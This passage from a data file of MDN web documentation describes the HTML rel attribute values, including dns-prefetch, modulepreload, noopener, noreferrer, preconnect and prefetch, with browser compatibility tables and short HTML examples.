`rel` attribute value for the [`<a>`](../element/a) and [`<area>`](../element/area) elements. Gives a permalink for the nearest ancestor [`<article>`](../element/article) element, if there is one. If there is no ancestor `<article>` element, gives a permalink for the section the linking element is most closely associated with.\n\n[`canonical`](#canonical)  \nValid for [`<link>`](../element/link), it defines the preferred URL for the current document, which helps search engines reduce duplicate content.\n\n[`dns-prefetch`](#dns-prefetch)  \nRelevant for the [`<link>`](../element/link) element both in the [`<body>`](../element/body) and [`<head>`](../element/head), it tells the browser to preemptively perform DNS resolution for the target resource's origin. Useful for resources the user will likely need, it helps reduce latency and thereby improves performance when the user does access the resources as the browser preemptively performed DNS resolution for the origin of the specified resource. See [dns-prefetch](https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch) described in [resource hints](https://w3c.github.io/resource-hints/).\n\n[`external`](#external)  \nRelevant to [`<form>`](../element/form), [`<a>`](../element/a), and [`<area>`](../element/area), it indicates the referenced document is not part of the current site. This can be used with attribute selectors to style external links in a way that indicates to the user that they will be leaving the current site.\n\n[`expect`](#expect) Experimental  \nAllows the page to be [render-blocked](https://developer.mozilla.org/en-US/docs/Glossary/Render_blocking) until the essential parts of the document are parsed so it will render consistently. Note that render-blocking occurs only when supplemented with the [`blocking=\"render\"`](../element/link#blocking) attribute.\n\n**Note:** See [Stabilizing page state to make cross-document transitions consistent](https://developer.mozilla.org/en-US/docs/Web/API/View_Transitions_API/Using#stabilizing_page_state_to_make_cross-document_transitions_consistent) for more information on its use.\n\n[`help`](#help)  \nRelevant to [`<form>`](../element/form), [`<link>`](../element/link), [`<a>`](../element/a), and [`<area>`](../element/area), the `help` keyword indicates that the linked to content provides context-sensitive help, providing information for the parent of the element defining the hyperlink, and its children. When used within `<link>`, the help is for the whole document. When included with [`<a>`](../element/a) and [`<area>`](../element/area) and supported, the default [`cursor`](https://developer.mozilla.org/en-US/docs/Web/CSS/cursor) will be `help` instead of `pointer`.\n\n[`icon`](#icon)  \nValid with [`<link>`](../element/link), the linked resource represents the icon, a resource for representing the page in the user interface, for the current document.\n\nThe most common use for the `icon` value is the favicon:\n\nhtml\n\n```\n<link rel=\"icon\" href=\"favicon.ico\" />\n```\n\nIf there are multiple `<link rel=\"icon\">`s, the browser uses their [`media`](../element/link#media), [`type`](../element/link#type), and [`sizes`](../element/link#sizes) attributes to select the most appropriate icon. If several icons are equally appropriate, the last one is used. If the most appropriate icon is later found to be inappropriate, for example because it uses an unsupported format, the browser proceeds to the next-most appropriate, and so on.\n\n**Note:** The [`crossorigin`](crossorigin) attribute is not supported for `rel=\"icon\"` in Chromium-based browsers. See the [open Chromium issue](https://crbug.com/1121645).\n\n**Note:** Apple's iOS does not use this link type, nor the [`sizes`](../element/link#sizes) attribute, like others mobile browsers do, to select a webpage icon for Web Clip or a start-up placeholder. Instead it uses the non-standard [`apple-touch-icon`](https://developer.apple.com/library/archive/documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html#//apple_ref/doc/uid/TP40002051-CH3-SW4) and [`apple-touch-startup-image`](https://developer.apple.com/library/archive/documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html#//apple_ref/doc/uid/TP40002051-CH3-SW6) respectively.\n\n**Note:** The `shortcut` link type is often seen before `icon`, but this link type is non-conforming, ignored and **web authors must not use it anymore**.\n\n[`license`](#license)  \nValid on the [`<a>`](../element/a), [`<area>`](../element/area), [`<form>`](../element/form), [`<link>`](../element/link) elements, the `license` value indicates that the hyperlink leads to a document describing the licensing information; that the main content of the current document is covered by the copyright license described by the referenced document. If not inside the [`<head>`](../element/head) element, the standard doesn't distinguish between a hyperlink applying to a specific part of the document or to the document as a whole. Only the data on the page can indicate this.\n\nhtml\n\n```\n<link rel=\"license\" href=\"#license\" />\n```\n\n**Note:** Although recognized, the synonym `copyright` is incorrect and must be avoided.\n\n[`manifest`](#manifest)  \n[Web app manifest](https://developer.mozilla.org/en-US/docs/Web/Manifest). Requires the use of the CORS protocol for cross-origin fetching.\n\n[`modulepreload`](#modulepreload)  \nUseful for improved performance, and relevant to the [`<link>`](../element/link) anywhere in the document, setting `rel=\"modulepreload\"` tells the browser to preemptively fetch the script (and dependencies) and store it in the document's module map for later evaluation. `modulepreload` links can ensure network fetching is done with the module ready (but not evaluated) in the module map before it is necessarily needed. See also [`modulepreload`](rel/modulepreload).\n\n[`next`](#next)  \nRelevant to [`<form>`](../element/form), [`<link>`](../element/link), [`<a>`](../element/a), and [`<area>`](../element/area), the `next` values indicates that the current document is a part of a series, and that the next document in the series is the referenced document. When included in a `<link>`, browsers may assume that document will be fetched next, and treat it as a resource hint.\n\n[`nofollow`](#nofollow)  \nRelevant to [`<form>`](../element/form), [`<a>`](../element/a), and [`<area>`](../element/area), the `nofollow` keyword tells search engine spiders to ignore the link relationship. The nofollow relationship may indicate the current document's owner does not endorse the referenced document. It is often included by Search Engine Optimizers pretending their link farms are not spam pages.\n\n[`noopener`](#noopener)  \nRelevant to [`<form>`](../element/form), [`<a>`](../element/a), and [`<area>`](../element/area), creates a top-level browsing context that is not an auxiliary browsing context if the hyperlink would create either of those to begin with (i.e., has an appropriate `target` attribute value). In other words, it makes the link behave as if [`window.opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) were null and `target=\"_parent\"` were set.\n\nThis is the opposite of [`opener`](#opener).\n\n[`noreferrer`](#noreferrer)  \nRelevant to [`<form>`](../element/form), [`<a>`](../element/a), and [`<area>`](../element/area), including this value makes the referrer unknown (no `Referer` header will be included), and creates a top-level browsing context as if `noopener` were also set.\n\n[`opener`](#opener)  \nCreates an auxiliary browsing context if the hyperlink would otherwise create a top-level browsing context that is not an auxiliary browsing context (i.e., has \"`_blank`\" as `target` attribute value). Effectively, the opposite of [noopener](#noopener).\n\n[`pingback`](#pingback)  \nGives the address of the pingback server that handles pingbacks to the current document. See the [Pingback specification](https://www.hixie.ch/specs/pingback/pingback).\n\n[`preconnect`](#preconnect)  \nProvides a hint to the browser suggesting that it open a connection to the linked website in advance, without disclosing any private information or downloading any content, so that when the link is followed the linked content can be fetched more quickly.\n\n[`prefetch`](#prefetch)  \nSpecifies that the user agent should preemptively fetch and cache the target resource as it is likely to be required for a followup navigation. See [prefetch](https://developer.mozilla.org/en-US/docs/Glossary/Prefetch) for more information.\n\n[`preload`](#preload)  \nSpecifies that the user agent must preemptively fetch and cache the target resource for current navigation according to the potential destination given by the [`as`](../element/link#as) attribute (and the priority associated with the corresponding destination). See the page for the [`preload`](rel/preload) value.\n\n[`prerender`](#prerender) Deprecated Non-standard  \nSpecifies that the user agent should preemptively fetch the target resource and process it in a way that helps deliver a faster response in the future, for example by fetching its subresources or performing some rendering.\n\n[`prev`](#prev)  \nSimilar to the [`next`](#next) keyword, relevant to [`<form>`](../element/form), [`<link>`](../element/link), [`<a>`](../element/a), and [`<area>`](../element/area), the `prev` values indicates that the current document is a part of a series, and that the link references a previous document in the series is the referenced document.\n\nNote: The synonym `previous` is incorrect and should not be used.\n\n[`privacy-policy`](#privacy-policy)  \nValid for [`<a>`](../element/a), [`<area>`](../element/area), and [`<link>`](../element/link) elements, the `privacy-policy` value indicates that the referenced document is the Privacy Policy which describes the data collection and usage practices of the current document.\n\n[`search`](#search)  \nRelevant to [`<form>`](../element/form), [`<link>`](../element/link), [`<a>`](../element/a), and [`<area>`](../element/area) elements, the `search` keywords indicates that the hyperlink references a document whose interface is specially designed for searching in the current document, site, and related resources, providing a link to a resource that can be used to search.\n\nIf the [`type`](../element/link#type) attribute is set to `application/opensearchdescription+xml` the resource is an [OpenSearch](https://developer.mozilla.org/en-US/docs/Web/OpenSearch) plugin that can be easily added to the interface of Firefox.\n\n[`stylesheet`](#stylesheet)  \nValid for the [`<link>`](../element/link) element, it imports an external resource to be used as a stylesheet. The [`type`](../element/link#type) attribute is not needed if it's a `text/css` stylesheet, as that is the default value. If it's not a stylesheet of type `text/css` it is best to declare the type.\n\nWhile this attribute defines the link as being a stylesheet, the interaction with other attributes and other key terms within the rel value impact whether the stylesheet is downloaded and/or used.\n\nWhen used with the [`alternate`](#alternate) keyword, it defines an alternative style sheet. In this case, include a non-empty [`title`](../element/link#title).\n\nThe external stylesheet will not be used or even downloaded if the media does not match the value of the [`media`](../element/link#media) attribute.\n\nRequires the use of the CORS protocol for cross-origin fetching.\n\n[`tag`](#tag)  \nValid for the [`<a>`](../element/a), and [`<area>`](../element/area) elements, it gives a tag (identified by the given address) that applies to the current document. The tag value denotes that the link refers to a document describing a tag applying to the document on which it is located. This link type is not meant for tags within a tag cloud, as those tags apply to a group of pages, whereas the `tag` value of the `rel` attribute is for a single document.\n\n[`terms-of-service`](#terms-of-service)  \nValid for [`<a>`](../element/a), [`<area>`](../element/area), and [`<link>`](../element/link) elements, the `terms-of-service` value indicates that the referenced document is the Terms of Service that describes the agreements between the current document's provider and users who wish to use the document provided.\n\n### Non-standard values\n\n[`apple-touch-icon`](https://developer.apple.com/library/archive/documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html#//apple_ref/doc/uid/TP40002051-CH3-SW4)  \nSpecifies the icon for a web application on an iOS device.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `rel` | 108     | 108  | 111     | 94    | 15.4   | 108            | 111                 | 73            | 15.4          | 21.0             | 108             |     |\n\n[TABLE]\n\n[TABLE]\n\n[TABLE]\n\n### html.elements.link.rel\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.a.rel\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.area.rel\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.form.rel\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`HTMLLinkElement.relList`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLLinkElement/relList)\n- [`HTMLAnchorElement.relList`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/relList)\n- [`HTMLAreaElement.relList`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAreaElement/relList)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel)"
- name: Attributes.rel.dns-prefetch
  summary: The dns-prefetch keyword for the rel attribute of the <link> element is a hint to browsers that the user is likely to need resources from the target resource's origin, and therefore the browser can likely improve the user experience by preemptively performing DNS resolution for that origin
  description: "# rel=dns-prefetch\n\nThe `dns-prefetch` keyword for the [`rel`](../../element/link#rel) attribute of the [`<link>`](../../element/link) element is a hint to browsers that the user is likely to need resources from the target resource's origin, and therefore the browser can likely improve the user experience by preemptively performing DNS resolution for that origin.\n\nSee [Using dns-prefetch](https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch) for more details.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dns-prefetch` | 46      | ≤79  | 3       | 33    | 5      | 46             | 4                   | 33            | 4.2           | 5.0              | 46              |     |\n\n## See also\n\n- [Speculative loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Speculative_loading) for a comparison of `<link rel=\"dns-prefetch\">` and other similar performance improvement features.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/dns-prefetch](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/dns-prefetch)"
- name: Attributes.rel.manifest
  summary: The manifest keyword for the rel attribute of the <link> element indicates that the target resource is a Web app manifest
  description: "# rel=manifest\n\nThe `manifest` keyword for the [`rel`](../../element/link#rel) attribute of the [`<link>`](../../element/link) element indicates that the target resource is a [Web app manifest](https://developer.mozilla.org/en-US/docs/Web/Manifest).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `manifest` | 39      | 79   | No      | 26    | No     | 39             | 58                  | 26            | 11.3          | 4.0              | 39              |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/manifest](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/manifest)"
- name: Attributes.rel.me
  summary: The me keyword for the rel attribute of the <link> and <a> elements indicates that the current resource is represented by the linked party
  description: "# rel=me\n\nThe `me` keyword for the [`rel`](../../element/link#rel) attribute of the [`<link>`](../../element/link) and [`<a>`](../../element/a) elements indicates that the current resource is represented by the linked party. The `me` value was introduced in the [XHTML Friends Network (XFN) specification](https://gmpg.org/xfn/).\n\nhtml\n\n```\n<link rel=\"me\" href=\"example.com\" />\n```\n\nThe `rel=\"me\"` attribute is used in [RelMeAuth](https://microformats.org/wiki/RelMeAuth) and [Web sign in](https://microformats.org/wiki/web-sign-in) specifications as a way to enable a person to identify themselves to a web service using their domain name or a particular URL.\n\n## Specifications\n\n**No specification found**\n\nNo specification data found for `html.elements.link.rel.me`.  \n[Check for problems with this page](#on-github) or contribute a missing `spec_url` to [mdn/browser-compat-data](https://github.com/mdn/browser-compat-data). Also make sure the specification is included in [w3c/browser-specs](https://github.com/w3c/browser-specs).\n\n## Browser compatibility\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/me](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/me)"
- name: Attributes.rel.modulepreload
  summary: Since September 2023, this feature works across the latest devices and browser versions
  description: "# rel=modulepreload\n\n## Baseline 2023\n\nNewly available\n\nSince September 2023, this feature works across the latest devices and browser versions. This feature might not work in older devices or browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FAttributes%2Frel%2Fmodulepreload&level=low)\n\nThe `modulepreload` keyword, for the [`rel`](../rel) attribute of the [`<link>`](../../element/link) element, provides a declarative way to preemptively fetch a [module script](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules), parse and compile it, and store it in the document's module map for later execution.\n\nPreloading allows modules and their dependencies to be downloaded early, and can also significantly reduce the overall download and processing time. This is because it allows pages to fetch modules in parallel, instead of sequentially as each module is processed and its dependencies are discovered. Note however that you can't just preload everything! What you choose to preload must be balanced against other operations that might then be starved, adversely affecting user experience.\n\nLinks with `rel=\"modulepreload\"` are similar to those with [`rel=\"preload\"`](preload). The main difference is that `preload` just downloads the file and stores it in the cache, while `modulepreload` gets the module, parses and compiles it, and puts the results into the module map so that it is ready to execute.\n\nWhen using `modulepreload` the fetch request mode is always [`cors`](https://developer.mozilla.org/en-US/docs/Web/API/Request/mode#cors), and the [`crossorigin`](../crossorigin) property is used to determine the request [credential mode](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials). If `crossorigin` is set to [`anonymous`](../crossorigin#anonymous) or [`\"\"`](../crossorigin#sect1) (default), then the credentials mode is [`same-origin`](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials#same-origin), and user credentials such as cookies and authentication are only sent for requests with the `same-origin`. If `crossorigin` is set to [`use-credentials`](../crossorigin#use-credentials) then the credentials mode is [`include`](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials#include), and user credentials for both single- and cross-origin requests.\n\nThe [`as`](../../element/link#as) attribute is optional for links with `rel=\"modulepreload\"`, and defaults to `\"script\"`. It can be set to `\"script\"` or any script-like destination, such as `\"audioworklet\"`, `\"paintworklet\"`, `\"serviceworker\"`, `\"sharedworker\"`, or `\"worker\"`. An [`Event`](https://developer.mozilla.org/en-US/docs/Web/API/Event/Event) named \"error\" is fired on the element if any other destination is used.\n\nA browser *may* additionally also choose to automatically fetch any dependencies of the module resource. Note however that this is a browser-specific optimization — the only approach to ensure that all browsers will try to preload a module's dependencies is to individually specify them! Further, the events named `load` or `error` fire immediately following success or failure of loading the *specified* resources. If dependencies are automatically fetched, no additional events are fired in the main thread (although you might monitor additional requests in a service worker or on the server).\n\n## Examples\n\nConsider the [basic-modules](https://github.com/mdn/js-examples/tree/main/module-examples/basic-modules) example ([live version](https://mdn.github.io/js-examples/module-examples/basic-modules/)), introduced in the [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules#basic_example_structure) guide.\n\nThis has a file structure as shown below, consisting of the top level module `main.js`, which statically imports two dependency modules `modules/canvas.js` and `modules/square.js` using the [`import` statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import).\n\n```\nindex.html\nmain.js\nmodules/\n    canvas.js\n    square.js\n```\n\nThe HTML for the example below shows how `main.js` is fetched in a `<script>` element. Only after `main.js` has loaded does the browser discover and fetch the two dependency modules.\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <title>Basic JavaScript module example</title>\n    <style>\n      canvas {\n        border: 1px solid black;\n      }\n    </style>\n    <script type=\"module\" src=\"main.js\"></script>\n  </head>\n  <body></body>\n</html>\n```\n\nThe HTML below updates the example to use `<link>` elements with `rel=\"modulepreload\"` for the main file and each of the dependency modules. This is much faster because the three modules all start downloading asynchronously and in parallel before they are needed. By the time `main.js` has been parsed and its dependencies are known, they have already been fetched and downloaded.\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <title>Basic JavaScript module example</title>\n    <link rel=\"modulepreload\" href=\"main.js\" />\n    <link rel=\"modulepreload\" href=\"modules/canvas.js\" />\n    <link rel=\"modulepreload\" href=\"modules/square.js\" />\n    <style>\n      canvas {\n        border: 1px solid black;\n      }\n    </style>\n\n    <script type=\"module\" src=\"main.js\"></script>\n  </head>\n  <body></body>\n</html>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                 | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                 | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `modulepreload` | 66      | ≤79  | 115     | 53    | 17     | 66             | 115                 | 47            | 17            | 9.0              | 66              |     |\n\n## See also\n\n- [Speculative loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Speculative_loading) for a comparison of `<link rel=\"modulepreload\">` and other similar performance improvement features.\n- [Preloading modules](https://web.dev/articles/modulepreload) on web.dev\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/modulepreload](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/modulepreload)"
- name: Attributes.rel.noopener
  summary: The noopener keyword for the rel attribute of the <a>, <area>, and <form> elements instructs the browser to navigate to the target resource without granting the new browsing context access to the document that opened it — by not setting the Window.opener property on the opened window (it returns null)
  description: "# rel=noopener\n\nThe `noopener` keyword for the [`rel`](../rel) attribute of the [`<a>`](../../element/a), [`<area>`](../../element/area), and [`<form>`](../../element/form) elements instructs the browser to navigate to the target resource without granting the new browsing context access to the document that opened it — by not setting the [`Window.opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) property on the opened window (it returns `null`).\n\nThis is especially useful when opening untrusted links, in order to ensure they cannot tamper with the originating document via the [`Window.opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) property (see [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/) for more details), while still providing the `Referer` HTTP header (unless `noreferrer` is used as well).\n\nNote that when `noopener` is used, nonempty target names other than `_top`, `_self`, and `_parent` are all treated like `_blank` in terms of deciding whether to open a new window/tab.\n\n**Note:** Setting `target=\"_blank\"` on `<a>` elements now implicitly provides the same `rel` behavior as setting `rel=\"noopener\"` which does not set `window.opener`. See [browser compatibility](../../element/a#browser_compatibility) for support status.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n[TABLE]\n\n### html.elements.a.rel.noopener\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.area.rel.noopener\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener)"
- name: Attributes.rel.noreferrer
  summary: The noreferrer keyword for the rel attribute of the <a>, <area>, and <form> elements instructs the browser, when navigating to the target resource, to omit the Referer header and otherwise leak no referrer information — and additionally to behave as if the noopener keyword were also specified
  description: "# rel=noreferrer\n\nThe `noreferrer` keyword for the [`rel`](../rel) attribute of the [`<a>`](../../element/a), [`<area>`](../../element/area), and [`<form>`](../../element/form) elements instructs the browser, when navigating to the target resource, to omit the [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header and otherwise leak no referrer information — and additionally to behave as if the [`noopener`](noopener) keyword were also specified.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|              | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|              | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `noreferrer` | 16      | 13   | 33      | 15    | 5      | 18             | 33                  | 14            | 4.2           | 1.5              | 4.4             |     |\n\n|              | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|              | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `noreferrer` | 16      | 13   | 33      | 15    | 5      | 18             | 33                  | 14            | 4.2           | 1.5              | 4.4             |     |\n\n### html.elements.a.rel.noreferrer\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.area.rel.noreferrer\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noreferrer](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noreferrer)"
- name: Attributes.rel.preconnect
  summary: The preconnect keyword for the rel attribute of the <link> element is a hint to browsers that the user is likely to need resources from the target resource's origin, and therefore the browser can likely improve the user experience by preemptively initiating a connection to that origin
  description: "# rel=preconnect\n\nThe `preconnect` keyword for the [`rel`](../../element/link#rel) attribute of the [`<link>`](../../element/link) element is a hint to browsers that the user is likely to need resources from the target resource's origin, and therefore the browser can likely improve the user experience by preemptively initiating a connection to that origin. Preconnecting speeds up future loads from a given origin by preemptively performing part or all of the handshake (DNS+TCP for HTTP, and DNS+TCP+TLS for HTTPS origins).\n\n`<link rel=\"preconnect\">` will provide a benefit to any future cross-origin HTTP request, navigation or subresource. It has no benefit on same-origin requests because the connection is already open.\n\nIf a page needs to make connections to many third-party domains, preconnecting them all can be counterproductive. The `<link rel=\"preconnect\">` hint is best used for only the most critical connections. For the others, just use [`<link rel=\"dns-prefetch\">`](dns-prefetch) to save time on the first step — the DNS lookup.\n\n## Examples\n\nhtml\n\n```\n<link rel=\"preconnect\" href=\"https://example.com\" />\n```\n\nYou can also implement preconnect as an HTTP [Link](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Link) header, for example:\n\nhttp\n\n```\nLink: <https://example.com>; rel=\"preconnect\"\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Speculative loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Speculative_loading) for a comparison of `<link rel=\"preconnect\">` and other similar performance improvement features.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/preconnect](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/preconnect)"
- name: Attributes.rel.prefetch
  summary: The prefetch keyword for the rel attribute of the <link> element provides a hint to browsers that the user is likely to need the target resource for future navigations, and therefore the browser can likely improve the user experience by preemptively fetching and caching the resource
  description: "# rel=prefetch\n\nThe `prefetch` keyword for the [`rel`](../../element/link#rel) attribute of the [`<link>`](../../element/link) element provides a hint to browsers that the user is likely to need the target resource for future navigations, and therefore the browser can likely improve the user experience by preemptively fetching and caching the resource. `<link rel=\"prefetch\">` is used for same-site navigation resources, or for subresources used by same-site pages.\n\nThe result is kept in the HTTP cache on disk. Because of this it is useful for prefetching subresources, even if they are not used by the current page. You could also use it to prefetch the next document the user will likely visit on the site. However, as a result you need to be careful with headers — for example certain [Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control) headers could block prefetching (for example `no-cache` or `no-store`).\n\n**Note:** Because of such limitations, you are advised to use the [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API) for document prefetches instead, where it is supported.\n\n`<link rel=\"prefetch\">` is functionally equivalent to a [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/fetch) call with a `priority: \"low\"` option set on it, except that the former will generally have an even lower priority, and it will have a [`Sec-Purpose: prefetch`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Purpose) header set on the request. Note that in general browsers will give prefetch resources a lower priority than preload ones (e.g. requested via [`<link rel=\"preload\">`](preload)) — the current page is more important than the next.\n\nThe fetch request for a `prefetch` operation results in an HTTP request that includes the HTTP header [`Sec-Purpose: prefetch`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Purpose). A server might use this header to change the cache timeouts for the resources, or perform other special handling. The request will also include the [`Sec-Fetch-Dest`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest) header with the value set to `empty`.\n\nThe [`Accept`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept) header in the request will match the value used for normal navigation requests. This allows the browser to find the matching cached resources following navigation.\n\n## Examples\n\n### Basic prefetch\n\njs\n\n```\n<link rel=\"prefetch\" href=\"main.js\" />\n```\n\n### Navigation and subresource prefetches\n\nPrefetching can be used to fetch both HTML and sub-resources for a possible next navigation. A common use case is to have a simple website landing page that fetches more \"heavy-weight\" resources used by the rest of the site.\n\nhtml\n\n```\n<link rel=\"prefetch\" href=\"/app/style.css\" />\n<link rel=\"prefetch\" href=\"/landing-page\" />\n```\n\n### The effects of cache partitioning\n\nMany browsers now implement some form of [cache partitioning](https://developer.chrome.com/blog/http-cache-partitioning), which makes `<link rel=\"prefetch\">` useless for resources intended for use by different top-level sites. This includes the main document when navigating cross-site. So, for example, the following prefetch:\n\nhtml\n\n```\n<link rel=\"prefetch\" href=\"https://news.example/article\" />\n```\n\nWould not be accessible from `https://aggregator.example/`.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Speculative loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Speculative_loading) for a comparison of `<link rel=\"prefetch\">` and other similar performance improvement features.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/prefetch](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/prefetch)"
- name: Attributes.rel.preload
  summary: The preload value of the <link> element's rel attribute lets you declare fetch requests in the HTML's <head>, specifying resources that your page will need very soon, which you want to start loading early in the page lifecycle, before browsers' main rendering machinery kicks in
